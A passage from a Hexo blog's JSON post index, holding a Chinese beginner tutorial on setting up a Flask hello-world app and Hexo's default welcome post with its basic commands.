World","slug":"Flask01-Hello World","date":"2018-06-09T12:46:52.333Z","updated":"2018-06-18T16:20:22.731Z","comments":true,"path":"2018/06/09/Flask01-Hello World/","link":"","permalink":"http://yoursite.com/2018/06/09/Flask01-Hello World/","excerpt":"","text":"概述 准备整理最近学习的一系列的flask基础教程。 Hello world 安装python3 创建项目目录，激活虚拟环境，避免全局环境的污染 1234mkdir microblogcd microblogpython -m venv venvsource venv/bin/activate 安装flask 1pip install flask 目录结构 123456--|microblog---|run.py---|venv---|microblogapp----|__init__.py----|routes.py 初始化app 1234567from flask import Flask# __name__ 指定了flask的开始的点，flask根据__name__所指定的文件的位置来识别其他的资源，例如templates，static等文件夹。app = Flask(__name__)# 在最后面引入，避免了循环引用。from . import routes 定义routes 1234567from app import app# Flask 利用包装函数的概念，将视图和路由控制结合在一起@app.route(&apos;/&apos;)@app.route(&apos;/index&apos;)def index(): return &quot;Hello world&quot; 定义run.py 123#run.py 是为了flask运行指定的文件，在这里面引入appfrom microblogapp import app 启动 1234export FLASK_APP=run.pyflask run 输入 localhost:5000 完成了第一个应用。","categories":[{"name":"python","slug":"python","permalink":"http://yoursite.com/categories/python/"},{"name":"flask","slug":"python/flask","permalink":"http://yoursite.com/categories/python/flask/"}],"tags":[{"name":"Flask","slug":"Flask","permalink":"http://yoursite.com/tags/Flask/"}]},{"title":"Hello World","slug":"hello-world","date":"2018-06-09T06:58:25.169Z","updated":"2018-06-09T13:15:20.126Z","comments":true,"path":"2018/06/09/hello-world/","link":"","permalink":"http://yoursite.com/2018/06/09/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick Start Create a new post 1$ hexo new \"My New Post\" More info: Writing Run server 1$ hexo server More info: Server Generate static files 1$ hexo generate More info: Generating Deploy to remote sites 1$ hexo deploy More info: Deployment","categories":[{"name":"test","slug":"test","permalink":"http://yoursite.com/categories/test/"}],"tags":[]}]}